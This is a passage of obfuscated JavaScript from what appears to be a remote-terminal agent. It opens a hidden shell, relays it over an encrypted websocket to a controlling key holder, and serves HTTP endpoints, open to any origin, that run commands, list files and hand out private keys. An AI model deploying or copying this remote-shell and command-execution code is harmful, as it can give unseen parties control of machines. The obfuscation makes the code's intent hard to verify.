        a0aI = d, a0C[eC(0x82d)](c[eC(0x7ca)], d[eC(0x346)]), c['wFRfo'](a);
    }
});
process['on'](a0aQ(0x762), (a, b) => {
    const eE = a0aQ, c = { 'woHly': eE(0x6f5) };
    a0C[eE(0x484)](c['woHly'], a);
}), process['on'](a0aQ(0x1da), a => {
    const eF = a0aQ;
    a0C[eF(0x484)](eF(0x5a4), a), process[eF(0x6e0)](0x1);
});
class a0aK {
    constructor(a, b, c) {
        const eG = a0aQ, d = { 'AELje': eG(0x5a3) }, f = d[eG(0x821)][eG(0x281)]('|');
        let g = 0x0;
        while (!![]) {
            switch (f[g++]) {
            case '0':
                this[eG(0x604)] = b;
                continue;
            case '1':
                this['recvCipher'] = null;
                continue;
            case '2':
                this[eG(0x2ed)] = c;
                continue;
            case '3':
                this[eG(0x562)] = ![];
                continue;
            case '4':
                this[eG(0x891)] = a;
                continue;
            case '5':
                this['hs'] = null;
                continue;
            case '6':
                this[eG(0x67a)] = null;
                continue;
            }
            break;
        }
    }
    async ['init']() {
        const eH = a0aQ, a = {
                'RrESU': eH(0x22b),
                'YgKru': 'Noise_XX_25519_ChaChaPoly_BLAKE2s',
                'GMsYp': 'kisama_terminal_v1',
                'QUbNB': eH(0x63a)
            };
        await a0aJ;
        if (!a0aH)
            throw a0aI || new Error(a[eH(0x31a)]);
        const b = a0aH, c = this[eH(0x891)] ? b[eH(0x62c)]['NOISE_ROLE_INITIATOR'] : b['constants'][eH(0x61d)];
        this['hs'] = b['HandshakeState'](a[eH(0x527)], c);
        const d = Buffer[eH(0x45b)](a['GMsYp']), f = this[eH(0x604)] ? Buffer[eH(0x45b)](this[eH(0x604)], a[eH(0x3cb)]) : null, g = this['expectedRemotePubB64'] ? Buffer['from'](this['expectedRemotePubB64'], eH(0x63a)) : null;
        this['hs'][eH(0x4f0)](d, f, g, null);
    }
    [a0aQ(0x675)](a) {
        const eI = a0aQ, b = {
                'LPcAQ': function (d, f) {
                    return d > f;
                },
                'ufQuM': function (d, f) {
                    return d === f;
                }
            };
        if (this[eI(0x562)])
            return Buffer[eI(0x43b)](0x0);
        const c = a0aH;
        a && b[eI(0x2ba)](a[eI(0x32c)], 0x0) && b[eI(0x3a5)](this['hs'][eI(0x293)](), c[eI(0x62c)]['NOISE_ACTION_READ_MESSAGE']) && this['hs'][eI(0x42d)](a);
        if (this['hs']['GetAction']() === c[eI(0x62c)][eI(0x468)])
            return this['_splitAndFinish'](), Buffer['alloc'](0x0);
        if (this['hs'][eI(0x293)]() === c[eI(0x62c)][eI(0x852)]) {
            const d = this['hs'][eI(0x5f7)](new Uint8Array(0x0));
            return b['ufQuM'](this['hs'][eI(0x293)](), c[eI(0x62c)][eI(0x468)]) && this[eI(0x87b)](), Buffer[eI(0x45b)](d);
        }
        return Buffer[eI(0x43b)](0x0);
    }
    [a0aQ(0x87b)]() {
        const eJ = a0aQ, a = {
                'rMkWV': eJ(0x63a),
                'pohpM': function (g, h) {
                    return g && h;
                },
                'vqmwl': function (g, h) {
                    return g === h;
                },
                'zgxSd': eJ(0x7a1)
            };
        let b = null;
        try {
            b = this['hs'][eJ(0x5f9)]();
        } catch (g) {
            b = null;
        }
        const c = this[eJ(0x2ed)] ? Buffer[eJ(0x45b)](this['expectedRemotePubB64'], a[eJ(0x56b)]) : null, d = a[eJ(0x3e0)](b, c) && a[eJ(0x4ed)](b[eJ(0x32c)], c['length']) && a0k['timingSafeEqual'](Buffer[eJ(0x45b)](b), c);
        if (!d)
            throw new Error(a['zgxSd']);
        const f = this['hs']['Split']();
        this['sendCipher'] = f[0x0], this['recvCipher'] = f[0x1], this[eJ(0x562)] = !![];
        try {
            if (this['hs'])
                this['hs'][eJ(0x415)]();
        } catch (h) {
        }
        this['hs'] = null;
    }
    [a0aQ(0x3f3)](a) {
        const eK = a0aQ;
        if (!this[eK(0x562)])
            throw new Error(eK(0x4be));
        const b = new Uint8Array(0x0), c = new Uint8Array(a);
        return Buffer[eK(0x45b)](this['sendCipher'][eK(0x6a1)](b, c));
    }
    ['decrypt'](a) {
        const eL = a0aQ, b = { 'yzBCa': '握手未完成，无法解密数据' };
        if (!this['handshakeFinished'])
            throw new Error(b[eL(0x2eb)]);
        const c = new Uint8Array(0x0), d = new Uint8Array(a);
        return Buffer[eL(0x45b)](this['recvCipher'][eL(0x39d)](c, d));
    }
    [a0aQ(0x415)]() {
        const eM = a0aQ, a = eM(0x49d)['split']('|');
        let b = 0x0;
        while (!![]) {
            switch (a[b++]) {
            case '0':
                this['recvCipher'] = null;
                continue;
            case '1':
                this['hs'] = null;
                continue;
            case '2':
                try {
                    if (this['hs'])
                        this['hs'][eM(0x415)]();
                } catch (c) {
                }
                continue;
            case '3':
                try {
                    if (this[eM(0x2fe)])
                        this[eM(0x2fe)][eM(0x415)]();
                } catch (d) {
                }
                continue;
            case '4':
                this[eM(0x67a)] = null;
                continue;
            case '5':
                try {
                    if (this[eM(0x67a)])
                        this['sendCipher'][eM(0x415)]();
                } catch (f) {
                }
                continue;
            }
            break;
        }
    }
}
class a0aL {
    constructor(a, b, c) {
        const eN = a0aQ, d = { 'iRCNG': '5|2|1|0|3|4|6' }, f = d[eN(0x2cf)][eN(0x281)]('|');
        let g = 0x0;
        while (!![]) {
            switch (f[g++]) {
            case '0':
                this[eN(0x773)] = null;
                continue;
            case '1':
                this[eN(0x634)] = c;
                continue;
            case '2':
                this[eN(0x259)] = b;
                continue;
            case '3':
                this[eN(0x668)] = 0x0;
                continue;
            case '4':
                this[eN(0x87c)] = null;
                continue;
            case '5':
                this['shell'] = a;
                continue;
            case '6':
                this[eN(0x202)] = null;
                continue;
            }
            break;
        }
    }
    [a0aQ(0x6e9)]() {
        const eO = a0aQ, a = {
                'AUoNB': function (c, d) {
                    return c || d;
                },
                'MxBLn': function (c, d, f, g) {
                    return c(d, f, g);
                },
                'Iwrnp': eO(0x73d),
                'cmcFF': eO(0x2b6),
                'icmqN': eO(0x6e0)
            };
        this[eO(0x773)] = a['MxBLn'](a0r, this['shell'], [], {
            'env': this['env'],
            'cwd': this[eO(0x634)],
            'windowsHide': !![],
            'stdio': [
                a['Iwrnp'],
                a[eO(0x673)],
                a[eO(0x673)]
            ]
        }), this['pid'] = this['proc'][eO(0x668)] || 0x0;
        const b = this;
        this[eO(0x773)][eO(0x378)]['on'](a[eO(0x1d2)], c => b[eO(0x57f)](c)), this[eO(0x773)][eO(0x2e3)]['on'](a['cmcFF'], c => b[eO(0x57f)](c)), this[eO(0x773)]['on'](a[eO(0x4d0)], (c, d) => {
            const eP = eO;
            if (b[eP(0x202)])
                b['_onExitCb']({
                    'exitCode': c,
                    'signal': a[eP(0x2c9)](d, null)
                });
        });
    }
    [a0aQ(0x57f)](a) {
        const eQ = a0aQ, b = { 'dUaXf': eQ(0x3fb) };
        if (this[eQ(0x87c)])
            this['_onDataCb'](a[eQ(0x3e8)](b[eQ(0x256)]));
    }
    [a0aQ(0x6d6)](a) {
        return this['_onDataCb'] = a, {
            'dispose': () => {
                const eR = a0b;
                this[eR(0x87c)] = null;
            }
        };
    }
    [a0aQ(0x57c)](a) {
        const eS = a0aQ;
        return this[eS(0x202)] = a, {
            'dispose': () => {
                const eT = eS;
                this[eT(0x202)] = null;
            }
        };
    }
    [a0aQ(0x1c7)](a) {
        const eU = a0aQ;
        if (!this['proc'] || !this[eU(0x773)]['stdin'])
            return;
        try {
            this[eU(0x773)][eU(0x64c)]['write'](a);
        } catch (b) {
        }
    }
    ['resize']() {
    }
    [a0aQ(0x2c1)]() {
        const eV = a0aQ;
        try {
            if (this['proc'])
                this[eV(0x773)][eV(0x2c1)]();
        } catch (a) {
        }
    }
}
class a0aM {
    constructor() {
        const eW = a0aQ, a = {
                'PUyEe': '0|6|9|7|4|2|1|8|3|5',
                'iuIfG': eW(0x672)
            }, b = a[eW(0x233)]['split']('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this['ptyProcess'] = null;
                continue;
            case '1':
                this['msgResolvers'] = [];
                continue;
            case '2':
                this[eW(0x35d)] = [];
                continue;
            case '3':
                this['CONTROL_PUBLIC_KEY'] = a0O[eW(0x6e4)][eW(0x270)][eW(0x624)];
                continue;
            case '4':
                this[eW(0x712)] = a[eW(0x4a7)];
                continue;
            case '5':
                this['cipher'] = new a0aK(![], this[eW(0x54b)], this['CONTROL_PUBLIC_KEY']);
                continue;
            case '6':
                this['websocket'] = null;
                continue;
            case '7':
                this[eW(0x619)] = !![];
                continue;
            case '8':
                this['AGENT_PRIVATE_KEY'] = a0O[eW(0x6e4)][eW(0x342)]['private_b64'];
                continue;
            case '9':
                this[eW(0x451)] = null;
                continue;
            }
            break;
        }
    }
    async [a0aQ(0x544)]() {
        const eX = a0aQ, a = {
                'bObFC': function (b, c) {
                    return b === c;
                },
                'zCxPJ': 'win32'
            };
        this[eX(0x451)] && a0C['info']('[' + this['requestId'] + eX(0x667));
        if (this[eX(0x800)]) {
            a[eX(0x5f5)](process[eX(0x41f)], a[eX(0x35b)]) && this[eX(0x800)]['pid'] && this[eX(0x49b)](this['ptyProcess']['pid']);
            try {
                this[eX(0x800)][eX(0x2c1)]();
            } catch (b) {
            }
            this['ptyProcess'] = null;
        }
        if (this[eX(0x7a5)])
            this[eX(0x7a5)][eX(0x415)]();
        if (this[eX(0x862)])
            try {
                a[eX(0x5f5)](this[eX(0x862)][eX(0x2bf)], this['websocket'][eX(0x1d6)]) && this['websocket'][eX(0x6af)](0x3e8, eX(0x5da));
            } catch (c) {
            } finally {
                this['websocket'] = null;
            }
    }
    [a0aQ(0x49b)](a) {
        const eY = a0aQ, b = {
                'KqIHO': function (c, d, f, g) {
                    return c(d, f, g);
                }
            };
        try {
            b[eY(0x63c)](a0q, 'taskkill\x20/F\x20/T\x20/PID\x20' + a, { 'windowsHide': !![] }, () => {
            });
        } catch (c) {
        }
    }
    [a0aQ(0x7a4)](a) {
        const eZ = a0aQ, b = {
                'NIvfg': function (c, d) {
                    return c === d;
                },
                'roVlF': 'handshake',
                'MmByo': function (c, d) {
                    return c > d;
                },
                'zUEpZ': function (c, d) {
                    return c(d);
                },
                'EpmLX': function (c, d) {
                    return c === d;
                }
            };
        if (b['NIvfg'](this[eZ(0x712)], b[eZ(0x63d)])) {
            if (b[eZ(0x317)](this['msgResolvers'][eZ(0x32c)], 0x0)) {
                const c = this[eZ(0x39b)][eZ(0x2c5)]();
                b[eZ(0x27a)](c, a);
            } else
                this[eZ(0x35d)]['push'](a);
        } else
            b[eZ(0x2c0)](this['phase'], eZ(0x316)) && this[eZ(0x5c1)](a);
    }
    async [a0aQ(0x763)]() {
        const f0 = a0aQ;
        if (this[f0(0x35d)][f0(0x32c)] > 0x0)
            return this[f0(0x35d)][f0(0x2c5)]();
        return new Promise(a => {
            const f1 = f0;
            this[f1(0x39b)][f1(0x381)](a);
        });
    }
    async [a0aQ(0x461)](a) {
        const f2 = a0aQ, b = {
                'GYaOV': function (c, d) {
                    return c(d);
                },
                'nghaa': function (c, d) {
                    return c > d;
                },
                'uYcxY': f2(0x576),
                'zNMSY': function (c, d) {
                    return c(d);
                },
                'SbGqW': f2(0x2e7),
                'fKtOH': function (c, d) {
                    return c(d);
                },
                'PmxPg': f2(0x320)
            };
        b[f2(0x494)](a, f2(0x863));
        try {
            await this[f2(0x7a5)][f2(0x709)]();
            const c = await this[f2(0x763)](), d = this['cipher'][f2(0x675)](c);
            d && b[f2(0x81e)](d[f2(0x32c)], 0x0) && this['websocket'][f2(0x796)](d);
            const f = await this[f2(0x763)]();
            this[f2(0x7a5)][f2(0x675)](f);
            if (!this[f2(0x7a5)][f2(0x562)])
                throw new Error(b[f2(0x248)]);
            b[f2(0x535)](a, b[f2(0x594)]);
        } catch (g) {
            b['fKtOH'](a, f2(0x1f5) + g[f2(0x346)]);
            throw new Error(b[f2(0x78b)]);
        }
    }
    [a0aQ(0x84c)]() {
        const f3 = a0aQ, a = {
                'vZKAc': f3(0x31e),
                'gauNM': f3(0x3f8),
                'logyn': f3(0x29b),
                'Hhvzr': f3(0x7a0),
                'ouvBc': f3(0x20c),
                'Tydwg': f3(0x237),
                'AlqeX': '/bin/zsh',
                'SjgmY': f3(0x568)
            };
        if (process[f3(0x41f)] === 'win32') {
            const d = process.env.SystemRoot || a['vZKAc'], f = [
                    a0n[f3(0x48d)](d, a[f3(0x86e)], 'WindowsPowerShell', a[f3(0x51e)], a[f3(0x401)]),
                    process.env.COMSPEC,
                    a0n[f3(0x48d)](d, a[f3(0x86e)], f3(0x20c))
                ];
            for (const g of f) {
                if (g && a0l['existsSync'](g))
                    return g;
            }
            return a[f3(0x56f)];
        }
        const b = [
            a[f3(0x6ad)],
            a[f3(0x4ee)],
            f3(0x405)
        ];
        for (const h of b) {
            if (a0l[f3(0x235)](h))
                return h;
        }
        const c = process.env.SHELL;
        if (c && a0l['existsSync'](c))
            return c;
        return a[f3(0x1c9)];
    }
    async [a0aQ(0x4c5)](a, b, c) {
        const f4 = a0aQ, d = {
                'jSLwE': function (g, h) {
                    return g(h);
                },
                'zVMjt': f4(0x757),
                'axYdt': '🔐\x20检测到\x20Token，视为\x20WSS\x20链路，跳过\x20Noise',
                'auulQ': f4(0x346)
            };
        this[f4(0x862)] = a, this[f4(0x451)] = b;
        const f = g => a0C['info'](f4(0x36a) + b + ']\x20' + g);
        this[f4(0x619)] = !c, d[f4(0x5c6)](f, this['useNoise'] ? d[f4(0x718)] : d[f4(0x735)]), a['on'](d[f4(0x345)], g => this[f4(0x7a4)](g));
        try {
            this[f4(0x619)] && await this[f4(0x461)](f), await this[f4(0x82a)](f);
        } catch (g) {
            d[f4(0x5c6)](f, f4(0x6cb) + g['message']), await this[f4(0x544)]();
        }
    }
    async [a0aQ(0x82a)](a) {
        const f5 = a0aQ, b = {
                'ajhOO': f5(0x3fb),
                'rTXKG': function (g, h) {
                    return g === h;
                },
                'qrgHk': function (g, h) {
                    return g(h);
                },
                'XNqlk': f5(0x59e),
                'RUiyQ': function (g, h) {
                    return g(h);
                },
                'PTnXQ': 'xterm-256color',
                'PeUhV': 'C.UTF-8',
                'keLpy': function (g) {
                    return g();
                },
                'sojrZ': f5(0x87a),
                'jlsHP': f5(0x316),
                'QivCu': function (g, h) {
                    return g > h;
                },
                'UPXTb': f5(0x6af)
            }, c = this[f5(0x84c)]();
        b[f5(0x3f1)](a, f5(0x424) + c);
        const d = Object[f5(0x430)]({}, process.env);
        delete d['PROMPT_COMMAND'], d['TERM'] = b[f5(0x7ac)];
        if (!d[f5(0x21f)])
            d[f5(0x21f)] = b[f5(0x749)];
        const f = b['keLpy'](a0D);
        try {
            const g = {
                'name': b['PTnXQ'],
                'cols': 0x50,
                'rows': 0x18,
                'cwd': f,
                'env': d
            };
            if (process['platform'] === f5(0x577))
                try {
                    this[f5(0x800)] = a0B[f5(0x6e9)](c, [], g);
                } catch (h) {
                    a(f5(0x6f8) + h[f5(0x346)]), this['ptyProcess'] = new a0aL(c, d, f), this['ptyProcess'][f5(0x6e9)]();
                }
            else
                this[f5(0x800)] = a0B[f5(0x6e9)](c, [], g);
            a(f5(0x7b9) + (this[f5(0x800)][f5(0x668)] || b[f5(0x6ca)]) + ')'), this[f5(0x712)] = b[f5(0x3fa)];
            while (b[f5(0x224)](this[f5(0x35d)]['length'], 0x0)) {
                const i = this['msgQueue'][f5(0x2c5)]();
                this[f5(0x5c1)](i);
            }
            this[f5(0x800)][f5(0x6d6)](j => {
                const f6 = f5;
                try {
                    let k = Buffer[f6(0x45b)](j, b['ajhOO']);
                    this[f6(0x619)] && this[f6(0x7a5)] && this[f6(0x7a5)][f6(0x562)] && (k = this['cipher']['encrypt'](k)), b['rTXKG'](this['websocket'][f6(0x2bf)], 0x1) && this[f6(0x862)][f6(0x796)](k);
                } catch (l) {
                }
            }), this[f5(0x800)]['onExit'](({
                exitCode: j,
                signal: k
            }) => {
                const f7 = f5;
                b[f7(0x7bf)](a, f7(0x3bf) + j + f7(0x724) + k + ')'), this[f7(0x544)]();
            }), this[f5(0x862)]['on'](b[f5(0x1cd)], () => {
                const f8 = f5;
                b[f8(0x7bf)](a, b[f8(0x3b4)]), this['cleanup']();
            });
        } catch (j) {
            a(f5(0x730) + j[f5(0x346)]), await this[f5(0x544)]();
            throw j;
        }
    }
    [a0aQ(0x5c1)](a) {
        const f9 = a0aQ, b = {
                'UBUtS': function (c, d) {
                    return c === d;
                },
                'QSmJx': f9(0x782),
                'xnaTR': f9(0x371),
                'BTyQE': function (c, d) {
                    return c === d;
                },
                'iHIUi': f9(0x478),
                'jpHKJ': f9(0x63a),
                'QVTGo': f9(0x3fb)
            };
        if (!this[f9(0x800)])
            return;
        try {
            const c = Buffer[f9(0x45b)](a);
            let d;
            this[f9(0x619)] ? d = this['cipher'][f9(0x890)](c) : d = c;
            let f = ![], g = d[f9(0x3e8)](f9(0x3fb));
            if (g[f9(0x777)]()['startsWith']('{'))
                try {
                    const h = JSON[f9(0x4d7)](g);
                    f = !![];
                    if (b[f9(0x70e)](h[f9(0x53a)], 'heartbeat')) {
                        let i = Buffer['from'](JSON[f9(0x656)]({ 'type': b[f9(0x42f)] }));
                        if (this[f9(0x619)])
                            i = this['cipher'][f9(0x3f3)](i);
                        this[f9(0x862)][f9(0x796)](i);
                        return;
                    }
                    if (b[f9(0x70e)](h[f9(0x53a)], b[f9(0x2cc)])) {
                        this[f9(0x800)]['resize'](h['cols'] || 0x50, h[f9(0x801)] || 0x18);
                        return;
                    }
                    if (b['BTyQE'](h[f9(0x53a)], b[f9(0x388)]) && h[f9(0x2b6)] !== undefined) {
                        let j = h[f9(0x7f9)] === b[f9(0x2ff)] ? Buffer[f9(0x45b)](h[f9(0x2b6)], 'base64')[f9(0x3e8)](b[f9(0x655)]) : h[f9(0x2b6)];
                        this['ptyProcess'][f9(0x1c7)](j);
                        return;
                    }
                } catch (k) {
                    f = ![];
                }
            !f && this['ptyProcess'][f9(0x1c7)](d[f9(0x3e8)](b[f9(0x655)]));
        } catch (l) {
            a0C[f9(0x524)](f9(0x36a) + this[f9(0x451)] + f9(0x394) + l[f9(0x346)]);
            if (this[f9(0x619)])
                this['cleanup']();
        }
    }
}
async function a0aN(a = {}) {
    const fa = a0aQ, b = {
            'kECyz': function (c) {
                return c();
            },
            'oORfd': 'Access-Control-Expose-Headers',
            'ueWAQ': 'x-encrypted,\x20x-agent-version,\x20x-file-size,\x20x-original-path',
            'uqSaW': fa(0x66b),
            'ZPUvW': fa(0x310),
            'OJlAC': fa(0x456),
            'BgAFk': function (c, d) {
                return c === d;
            },
            'YAfja': fa(0x496),
            'hDtoN': fa(0x66a),
            'hjFJp': fa(0x58e),
            'OjerR': function (c, d) {
                return c / d;
            },
            'ogJuf': function (c, d) {
                return c > d;
            },
            'cyhQG': function (c, d) {
                return c - d;
            },
            'YZpWk': '📦\x20[Cache]\x20BaseInfo\x20命中有效缓存，直接输出。',
            'giXQf': fa(0x484),
            'WBhsA': function (c, d) {
                return c !== d;
            },
            'GpcQK': function (c, d, f) {
                return c(d, f);
            },
            'dCzkd': function (c, d) {
                return c(d);
            },
            'Fgufp': function (c, d) {
                return c / d;
            },
            'OQmKi': function (c, d) {
                return c > d;
            },
            'ItuOe': function (c, d) {
                return c - d;
            },
            'yYCPP': fa(0x83a),
            'HzqAo': function (c, d) {
                return c === d;
            },
            'LnTos': fa(0x63e),
            'HBZef': function (c, d) {
                return c === d;
            },
            'giLun': fa(0x258),
            'qDHmZ': 'x-chunk-id',
            'xFOvc': fa(0x296),
            'LHhRC': function (c, d) {
                return c || d;
            },
            'kaZgQ': function (c, d) {
                return c !== d;
            },
            'kcNYr': function (c, d) {
                return c(d);
            },
            'jLIzV': fa(0x4a0),
            'SlAya': fa(0x63a),
            'VmnPk': fa(0x584),
            'felSB': 'x-original-path',
            'BtKXF': fa(0x22d),
            'IDdcR': function (c, d, f) {
                return c(d, f);
            },
            'WrNzE': function (c, d, f) {
                return c(d, f);
            },
            'yADmv': function (c, d) {
                return c(d);
            },
            'RKYSM': function (c, d) {
                return c === d;
            },
            'IMhkn': function (c, d) {
                return c === d;
            },
            'fkdMw': function (c, d) {
                return c < d;
            },
            'qOemn': function (c, d) {
                return c(d);
            },
            'PAzKr': function (c, d) {
                return c(d);
            },
            'EtLaL': function (c, d) {
                return c === d;
            },
            'cPVDI': function (c, d) {
                return c === d;
            },
            'LurvN': function (c, d) {
                return c ?? d;
            },
            'IcSjM': 'port\x20is\x20required\x20and\x20must\x20be\x20an\x20integer\x20between\x201\x20and\x2065535',
            'GVNvW': function (c, d) {
                return c === d;
            },
            'WfNKH': fa(0x6a5),
            'YaAig': fa(0x3fb),
            'vcoUt': 'Server\x20listening\x20successfully',
            'AQylX': function (c, d) {
                return c === d;
            },
            'EhnOs': '@noble/curves/nist.js',
            'RvgrO': fa(0x5ee),
            'kqzMu': fa(0x5f3),
            'tbVTg': fa(0x240),
            'fNrWw': fa(0x720),
            'cFFMG': fa(0x55e),
            'XGBSt': fa(0x601),
            'urdYE': fa(0x528),
            'VxJGo': 'Initializing\x20TempKeyManager...',
            'EyHUT': fa(0x521),
            'KWhWF': fa(0x501),
            'KPNxt': 'Express\x20app\x20created\x20and\x20expressWs\x20applied',
            'KSgkF': '50mb',
            'piBvu': fa(0x2d6),
            'QwTlW': fa(0x839),
            'uqnSS': fa(0x6ed),
            'uCVez': fa(0x4f4),
            'xwYSy': '/api/file/list',
            'zYOfo': fa(0x3da),
            'inziH': fa(0x6b6),
            'psfZe': '/api/file',
            'jOGKH': fa(0x420),
            'uYwaW': 'application/octet-stream',
            'VDIZK': fa(0x4bf),
            'hYnbl': fa(0x60b),
            'sMGkK': '/api/task/onetime',
            'zTCbb': fa(0x1f6),
            'dTZfg': fa(0x540),
            'OfWQR': fa(0x73b),
            'fpfQz': '/api/task/log/cron',
            'ZQUQl': fa(0x1ed),
            'uuRxb': fa(0x60e),
            'Pquto': fa(0x6bd),
            'IwDDl': fa(0x892),
            'izGRs': '/api/ws/*',
            'vHWJF': fa(0x3e6),
            'UaoRt': fa(0x308),
            'JwhGl': 'SIGINT',
            'ecARJ': fa(0x65e),
            'qxGCF': fa(0x715)
        };
    try {
        const c = await import(b[fa(0x566)]);
        a0z = c[fa(0x7fe)];
        const d = await import(b[fa(0x606)]);
        a0A = d['secp256k1'], a0C[fa(0x4b3)](b['kqzMu']), a0O['merge'](a), a0C[fa(0x4b3)](b[fa(0x630)]), a0O[fa(0x20f)](), a0C[fa(0x4b3)](b[fa(0x40e)]), a0C[fa(0x4b3)](fa(0x79c));
        const f = new a0Q(a0O[fa(0x247)], a0O[fa(0x68d)]);
        a0C[fa(0x4b3)](b[fa(0x397)]);
        !a0O[fa(0x590)] && !f['ecdsaPubkey'] && (a0C[fa(0x484)](b[fa(0x855)]), a0C[fa(0x484)](b[fa(0x37b)]), process[fa(0x6e0)](0x1));
        a0C['debug'](b[fa(0x70a)]);
        const g = new a0P();
        g[fa(0x4cc)] = () => a0O[fa(0x806)](), a0C[fa(0x4b3)](b[fa(0x25c)]), a0C[fa(0x4b3)](b[fa(0x3ec)]);
        const h = new a0T();
        a0C[fa(0x4b3)]('SystemInfoCollector\x20initialized'), a0C['debug'](fa(0x65c));
        const i = b['kECyz'](a0f);
        a0w(i), a0C['debug'](b['KPNxt']), i['use']((m, n, o) => {
            const fb = fa, p = '4|2|3|1|5|0'[fb(0x281)]('|');
            let q = 0x0;
            while (!![]) {
                switch (p[q++]) {
                case '0':
                    b[fb(0x227)](o);
                    continue;
                case '1':
                    n[fb(0x78f)](b[fb(0x780)], b[fb(0x3ac)]);
                    continue;
                case '2':
                    n[fb(0x78f)](fb(0x583), b[fb(0x37e)]);
                    continue;
                case '3':
                    n[fb(0x78f)](fb(0x7cc), b[fb(0x343)]);
                    continue;
                case '4':
                    n[fb(0x78f)](b[fb(0x58d)], '*');
                    continue;
                case '5':
                    if (b['BgAFk'](m['method'], b['YAfja']))
                        return n[fb(0x765)](0xc8)[fb(0x4ef)]();
                    continue;
                }
                break;
            }
        }), i[fa(0x78e)](a0f[fa(0x6d5)]({
            'type': m => m[fa(0x793)] !== fa(0x420),
            'limit': b['KSgkF']
        })), i['use'](a0f['urlencoded']({ 'extended': !![] })), i[fa(0x78e)](b[fa(0x39c)](a0S, f, g)), a0C[fa(0x4b3)](b[fa(0x2f7)]), i['get'](b[fa(0x6db)], async (m, n) => {
            const fc = fa, o = {
                    'qoNaD': b[fc(0x6a0)],
                    'Zggaj': b[fc(0x788)]
                };
            try {
                const p = Math[fc(0x479)](b[fc(0x438)](Date[fc(0x86c)](), 0x3e8));
                !a0O[fc(0x5ea)] || b[fc(0x340)](b['cyhQG'](p, a0O[fc(0x4d8)]), a0O[fc(0x844)]) ? (!a0O[fc(0x58f)] && (a0O[fc(0x58f)] = h[fc(0x7ae)]()[fc(0x510)](r => {
                    const fd = fc, s = o['qoNaD'][fd(0x281)]('|');
                    let t = 0x0;
                    while (!![]) {
                        switch (s[t++]) {
                        case '0':
                            return r;
                        case '1':
                            a0O['_baseinfo_fetch_promise'] = null;
                            continue;
                        case '2':
                            a0C[fd(0x4b3)](o[fd(0x211)]);
                            continue;
                        case '3':
                            a0O[fd(0x5ea)] = r;
                            continue;
                        case '4':
                            a0O[fd(0x4d8)] = Math['floor'](Date[fd(0x86c)]() / 0x3e8);
                            continue;
                        }
                        break;
                    }
                })[fc(0x5e7)](r => {
                    const fe = fc;
                    a0O[fe(0x58f)] = null;
                    throw r;
                })), await a0O[fc(0x58f)]) : a0C['debug'](b[fc(0x678)]);
                const q = { ...a0O[fc(0x5ea)] };
                b[fc(0x5f6)](m['is_authenticated'], !![]) ? (q[fc(0x205)] = a0O[fc(0x2f9)], q['noise_key'] = a0O[fc(0x38e)]) : (q[fc(0x205)] = null, q['noise_key'] = null), n['json'](q), a0O[fc(0x61a)] === '1' && a0aG[fc(0x59c)]();
            } catch (r) {
                n[fc(0x765)](0x1f4)['json']({
                    'status': b[fc(0x5c4)],
                    'message': r[fc(0x346)]
                });
            }
        }), i[fa(0x52b)](b[fa(0x5ac)], (m, n) => {
            const ff = fa;
            let o = a0O[ff(0x572)];
            if (b[ff(0x34e)](m['query']['ttl'], undefined)) {
                const r = b[ff(0x563)](parseInt, m[ff(0x73f)][ff(0x882)], 0xa);
                if (Number['isNaN'](r) || r < 0x1 || r > a0O[ff(0x50e)])
                    return n[ff(0x765)](0x1a6)[ff(0x1d5)]({ 'error': ff(0x216) + a0O['TEMPKEY_MAX_TTL_HOURS'] });
                o = r;
            }
            const p = g[ff(0x4d1)](o), q = s => new Date(s * 0x3e8)[ff(0x860)]()[ff(0x538)](ff(0x702), 'Z');
            n[ff(0x1d5)]({
                'status': 'ok',
                'key_id': p[ff(0x52e)],
                'ttl_seconds': p[ff(0x74a)],
                'created_at': b[ff(0x6fc)](q, p['created_at']),
                'expires_at': b[ff(0x6fc)](q, p[ff(0x5a2)]),
                'ecdsa': {
                    'private_key': p[ff(0x621)][ff(0x777)](),
                    'public_key': p[ff(0x49e)][ff(0x777)]()
                },
                'ecies': {
                    'private_key': p[ff(0x68a)],
                    'public_key': p['ecies_public_key']
                }
            });
        }), i[fa(0x52b)](b[fa(0x2f0)], async (m, n) => {
            const fg = fa;
            try {
                const o = Math[fg(0x479)](b[fg(0x607)](Date[fg(0x86c)](), 0x3e8));
                !a0O[fg(0x570)] || b['OQmKi'](b[fg(0x1e1)](o, a0O[fg(0x6b7)]), a0O['STATUS_CACHE_TTL']) ? (!a0O[fg(0x4ac)] && (a0O['_status_fetch_promise'] = h[fg(0x6ae)]()[fg(0x510)](q => {
                    const fh = fg, r = '1|2|0|4|3'[fh(0x281)]('|');
                    let s = 0x0;
                    while (!![]) {
                        switch (r[s++]) {
                        case '0':
                            a0O[fh(0x4ac)] = null;
                            continue;
                        case '1':
                            a0O[fh(0x570)] = q;
                            continue;
                        case '2':
                            a0O['_status_cache_time'] = Math[fh(0x479)](Date['now']() / 0x3e8);
                            continue;
                        case '3':
                            return q;
                        case '4':
                            a0C['debug'](fh(0x54e));
                            continue;
                        }
                        break;
                    }
                })['catch'](q => {
                    a0O['_status_fetch_promise'] = null;
                    throw q;
                })), await a0O[fg(0x4ac)]) : a0C[fg(0x4b3)](b[fg(0x53e)]);
                const p = { ...a0O[fg(0x570)] };
                n[fg(0x1d5)](p);
            } catch (q) {
                n[fg(0x765)](0x1f4)[fg(0x1d5)]({
                    'status': fg(0x484),
                    'message': q['message']
                });
            }
        }), i['post'](fa(0x514), async (m, n) => {
            const fi = fa;
            try {
                let o = null;
                if (b[fi(0x878)](typeof m[fi(0x554)], b[fi(0x3a3)]))
                    o = m[fi(0x554)][fi(0x777)]();
                else
                    m[fi(0x554)] && b['HBZef'](typeof m[fi(0x554)], fi(0x6fa)) && (o = m[fi(0x554)][fi(0x2d0)] || '');
                if (!o)
                    return n[fi(0x765)](0x190)['json']({
                        'status': b[fi(0x5c4)],
                        'message': fi(0x217)
                    });
                const p = await a0U[fi(0x88b)](o, {
                    'cwd': m[fi(0x554)][fi(0x634)],
                    'env': m[fi(0x554)]['env'],
                    'timeout': a0O['Rtimeout']
                });
                n[fi(0x1d5)](p);
            } catch (q) {
                n[fi(0x765)](0x1f4)[fi(0x1d5)]({
                    'status': b[fi(0x5c4)],
                    'message': q[fi(0x346)]
                });
            }
        }), i[fa(0x88d)](b[fa(0x46d)], async (m, n) => {
            const fj = fa;
            try {
                const o = await a0W[fj(0x307)](m['body'][fj(0x793)], m[fj(0x554)]['recursive']);
                n['json']({
                    'status': 'ok',
                    'count': o[fj(0x32c)],
                    'files': o
                });
            } catch (p) {
                n[fj(0x765)](0x1f4)[fj(0x1d5)]({
                    'status': b[fj(0x5c4)],
